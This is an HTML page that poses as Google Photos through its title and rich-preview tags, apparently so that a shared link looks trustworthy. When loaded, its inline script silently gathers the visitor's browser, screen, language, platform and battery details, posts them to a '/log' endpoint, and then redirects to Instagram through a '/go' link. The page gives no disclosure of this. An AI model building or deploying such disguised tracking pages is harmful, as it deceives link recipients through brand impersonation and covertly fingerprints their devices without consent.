<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google Photos</title>

  <!-- ✅ Open Graph tags for rich preview -->
  <meta property="og:title" content="Google Photos" />
  <meta property="og:description" content="Google Photos is a cloud-based platform developed by Google for storing, organizing, editing, and sharing photos and videos. It offers users a way to back up their media from various devices and access it from anywhere with an internet connection." />
  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRuTDI7OtZS0ShtudT3pXNi_4kb7a_RbvCIbdfvSKZ6g6DlqZzaa0xBofH9&s=10" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://yourdomain.com/" />
  <meta name="twitter:card" content="summary_large_image" />

  <!-- ✅ Instant redirect with logging -->
  <script>
    (async () => {
      const browserInfo = navigator.userAgent || "Unavailable";
      const screenSize = `${screen.width}x${screen.height}`;
      const language = navigator.language || navigator.userLanguage || "Unknown";
      const platform = navigator.platform || "Unknown";

      let batteryLevel = "Unavailable";
      let charging = "Unavailable";

      try {
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          batteryLevel = `${Math.round(battery.level * 100)}%`;
          charging = battery.charging ? "Yes" : "No";
        }
      } catch (err) {
        console.warn("Battery info not available:", err);
      }

      try {
        await fetch('/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            screen: screenSize,
            language,
            platform,
            browserInfo,
            battery: {
              level: batteryLevel,
              charging: charging
            }
          })
        });
      } catch (err) {
        console.warn("Failed to send log:", err);
      }

      window.location.href = "/go?url=https://www.instagram.com";
    })();
  </script>
</head>
<body></body>
</html>
